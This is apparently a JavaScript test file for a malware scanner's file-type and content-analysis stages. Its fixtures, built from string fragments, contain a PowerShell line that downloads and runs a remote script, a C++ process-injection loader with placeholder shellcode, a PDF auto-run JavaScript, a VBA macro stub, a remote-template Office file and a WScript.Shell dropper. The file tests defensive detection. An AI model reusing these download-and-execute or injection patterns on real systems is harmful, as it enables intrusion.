"use strict";

// The file_type and content_analysis stages (scripts/content_analyze.py):
// every upload is identified from its bytes, PEs go to the PE analyzer, and
// documents, PDFs, scripts, source code, archives etc. get their own analysis.
//
// Fixtures are built at runtime and suspicious strings are assembled from
// pieces, so no file in the repo looks like malware to a teammate's antivirus.

const { resetDb } = require("./helpers/testDb");

const path = require("node:path");
const fs = require("node:fs");
const os = require("node:os");
const { spawnSync } = require("node:child_process");

process.env.ANALYZER_SCRIPT_PATH = path.join(__dirname, "..", "scripts", "mock_analyze.py");
process.env.UPLOAD_DIR = fs.mkdtempSync(path.join(os.tmpdir(), "sentinel-content-"));
process.env.CONTENT_ANALYZER_PATH = path.join(__dirname, "..", "scripts", "content_analyze.py");
process.env.SANDBOX_URL = "";
process.env.LLM_DIR = "";

const test = require("node:test");
const assert = require("node:assert/strict");
const { makeZip } = require("./helpers/makeZip");

const python = process.env.PYTHON_PATH || "python3";
const skip = spawnSync(python, ["--version"]).status === 0 ? false : `${python} not available`;

const request = skip ? null : require("supertest");
const app = skip ? null : require("../src/app").createApp();
const { buildLlmInput } = require("../src/adapters/llmInput");
const { staticAnalysisStage, createContentAnalysisStage } = require("../src/pipeline/stages");

test.before(resetDb);

const j = (...parts) => parts.join("");

async function scan(buffer, filename) {
  const res = await request(app).post("/api/samples?wait=true").attach("file", buffer, filename);
  assert.equal(res.status, 201, JSON.stringify(res.body));
  const byStage = Object.fromEntries(res.body.results.map((r) => [r.stage, r]));
  return { body: res.body, byStage };
}

function ids(result) {
  assert.equal(result.status, "complete", JSON.stringify(result.error));
  return result.report.findings.map((f) => f.id);
}

// A minimal but valid PE header: "MZ", e_lfanew -> "PE\0\0".
function tinyPe() {
  const buf = Buffer.alloc(0x200);
  buf.write("MZ", 0, "latin1");
  buf.writeUInt32LE(0x80, 0x3c);
  buf.write("PE\0\0", 0x80, "latin1");
  return buf;
}

test("a PDF that runs JavaScript on open is flagged; the PE analyzer is skipped", { skip }, async () => {
  const pdf = Buffer.from(
    j("%PDF-1.4\n1 0 obj<</Type/Catalog/Open", "Action 2 0 R>>endobj\n",
      "2 0 obj<</S/Java", "Script/JS(app.alert(1))>>endobj\n/URI(http://pdf-ioc.example/x)\n%%EOF"),
    "latin1"
  );
  const { byStage } = await scan(pdf, "statement.pdf");

  assert.equal(byStage.file_type.report.category, "pdf");
  assert.equal(byStage.file_type.report.extension_mismatch, false);
  assert.equal(byStage.static_analysis, undefined);
  assert.ok(ids(byStage.content_analysis).includes("pdf_auto_javascript"));
  assert.equal(byStage.content_analysis.report.risk_level, "high");
  assert.deepEqual(byStage.content_analysis.report.indicators.domains, ["pdf-ioc.example"]);
});

test("a clean PDF has no findings", { skip }, async () => {
  const { byStage } = await scan(Buffer.from("%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\n%%EOF"), "clean.pdf");
  assert.deepEqual(ids(byStage.content_analysis), []);
  assert.equal(byStage.content_analysis.report.risk_level, "none");
});

test("an Office document with macros and a remote template is flagged", { skip }, async () => {
  const docm = makeZip({
    "[Content_Types].xml": "<Types/>",
    "word/document.xml": "<w:document><w:t>Enable content to view</w:t></w:document>",
    "word/_rels/settings.xml.rels":
      '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" ' +
      'Target="http://template-host.example/t.dotm" TargetMode="External"/></Relationships>',
    "word/vbaProject.bin": Buffer.from(j("\xd0\xcf\x11\xe0 _VBA_", "PROJECT Attribute VB_Name Auto", "Open Sh", "ell"), "latin1"),
  });
  const { byStage } = await scan(docm, "invoice.docm");

  assert.equal(byStage.file_type.report.category, "office");
  assert.equal(byStage.file_type.report.format, "docx");
  const found = ids(byStage.content_analysis);
  assert.ok(found.includes("vba_macros"), found);
  assert.ok(found.includes("remote_template"), found);
  assert.ok(byStage.content_analysis.report.indicators.urls.includes("http://template-host.example/t.dotm"));
});

test("a PowerPoint (.pptx) without anything suspicious is clean", { skip }, async () => {
  const pptx = makeZip({
    "[Content_Types].xml": "<Types/>",
    "ppt/presentation.xml": "<p:presentation/>",
    "ppt/slides/slide1.xml": "<p:sld><a:t>Quarterly review</a:t></p:sld>",
  });
  const { byStage } = await scan(pptx, "deck.pptx");
  assert.equal(byStage.file_type.report.format, "pptx");
  assert.equal(byStage.content_analysis.report.risk_level, "none");
});

test("a PowerShell download-and-run script is flagged", { skip }, async () => {
  const ps1 = j("$w = New-Object Net.Web", "Client; I", "EX $w.Download", "String('http://203.0.113.9/a.ps1')\n");
  const { byStage } = await scan(Buffer.from(ps1), "update.ps1");
  assert.equal(byStage.file_type.report.format, "powershell");
  const found = ids(byStage.content_analysis);
  assert.ok(found.includes("download_and_execute"), found);
  assert.deepEqual(byStage.content_analysis.report.indicators.ips, ["203.0.113.9"]);
});

test("C++ source with a process-injection sequence and shellcode is flagged", { skip }, async () => {
  const bytes = Array.from({ length: 200 }, (_, i) => `0x${(i % 256).toString(16).padStart(2, "0")}`).join(",");
  const cpp = [
    "#include <windows.h>",
    `unsigned char buf[] = { ${bytes} };`,
    "int main() {",
    "  HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234);",
    j("  LPVOID p = Virtual", "AllocEx(h, NULL, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);"),
    j("  Write", "ProcessMemory(h, p, buf, sizeof buf, NULL);"),
    j("  Create", "RemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, NULL);"),
    "}",
  ].join("\n");
  const { byStage } = await scan(Buffer.from(cpp), "loader.cpp");

  assert.equal(byStage.file_type.report.category, "source");
  assert.equal(byStage.file_type.report.format, "cpp");
  assert.equal(byStage.static_analysis, undefined);
  const found = ids(byStage.content_analysis);
  assert.equal(found[0], "process_injection_pattern");
  assert.ok(found.includes("embedded_shellcode"), found);
});

test("ordinary C++ source has no findings", { skip }, async () => {
  const cpp = '#include <iostream>\nint main() { std::cout << "hello" << std::endl; return 0; }\n';
  const { byStage } = await scan(Buffer.from(cpp), "hello.cpp");
  assert.deepEqual(ids(byStage.content_analysis), []);
});

test("an executable renamed to .pdf is identified as a PE and sent to the PE analyzer", { skip }, async () => {
  const { byStage } = await scan(tinyPe(), "invoice.pdf");

  assert.equal(byStage.file_type.report.format, "pe");
  assert.equal(byStage.file_type.report.extension_mismatch, true);
  assert.deepEqual(byStage.file_type.report.warnings.map((w) => w.id), ["extension_mismatch"]);
  assert.equal(byStage.file_type.report.risk_level, "high");
  assert.equal(byStage.static_analysis.status, "complete");
  assert.equal(byStage.content_analysis, undefined);
});

test("a double extension (report.pdf.exe) is flagged", { skip }, async () => {
  const { byStage } = await scan(tinyPe(), "report.pdf.exe");
  assert.ok(byStage.file_type.report.warnings.some((w) => w.id === "double_extension"));
});

test("a ZIP is unpacked and each file inside is analyzed", { skip }, async () => {
  const zip = makeZip({
    "readme.txt": "nothing to see",
    "invoice.pdf.js": j("var s = new ActiveX", "Object('WScript.Sh", "ell'); s.Run('calc');"),
  });
  const { byStage } = await scan(zip, "documents.zip");

  assert.equal(byStage.file_type.report.category, "archive");
  const report = byStage.content_analysis.report;
  assert.equal(report.details.member_count, 2);
  const js = report.details.members.find((m) => m.name === "invoice.pdf.js");
  assert.equal(js.format, "jscript");
  assert.ok(js.findings.some((f) => f.id === "wscript_shell"));
  assert.ok(ids(byStage.content_analysis).includes("member_name_trick"));
});

test("a file nobody recognizes still goes to the PE analyzer, as before", { skip }, async () => {
  const { byStage } = await scan(Buffer.from("just some bytes\n"), "sample.bin");
  assert.equal(byStage.file_type.report.category, "unknown");
  assert.equal(byStage.static_analysis.status, "complete");
});

test("routing: without a file_type report the PE analyzer runs for every file", () => {
  assert.equal(staticAnalysisStage.shouldRun({}, { reports: {} }), true);
  assert.equal(staticAnalysisStage.shouldRun({}, { reports: { file_type: { category: "pdf", format: "pdf" } } }), false);
  assert.equal(staticAnalysisStage.shouldRun({}, { reports: { file_type: { category: "executable", format: "pe" } } }), true);
  const content = createContentAnalysisStage({ pythonPath: python, scriptPath: "x", timeoutMs: 1 });
  assert.equal(content.shouldRun({}, { reports: {} }), false);
  assert.equal(content.shouldRun({}, { reports: { file_type: { format: "pe" } } }), false);
  assert.equal(content.shouldRun({}, { reports: { file_type: { format: "pdf" } } }), true);
});

test("llm input: content_analysis findings and indicators reach the LLM stage", () => {
  const content = {
    risk_level: "high",
    findings: [{ id: "remote_template", severity: "high" }],
    indicators: { urls: ["http://template-host.example/t.dotm"], domains: ["template-host.example"], ips: ["10.0.0.1", "198.51.100.7"] },
  };
  const { report, indicators } = buildLlmInput(
    { submission_type: "file", sha256: "ab".repeat(32), original_filename: "invoice.docm" },
    { file_type: { category: "office" }, content_analysis: content }
  );
  assert.deepEqual(report.static_analysis, content);
  assert.deepEqual(report.file_type, { category: "office" });
  assert.deepEqual(indicators, [
    { indicator: "ab".repeat(32), type: "hash" },
    { indicator: "http://template-host.example/t.dotm", type: "url" },
    { indicator: "template-host.example", type: "domain" },
    { indicator: "198.51.100.7", type: "ip" },
  ]);
});
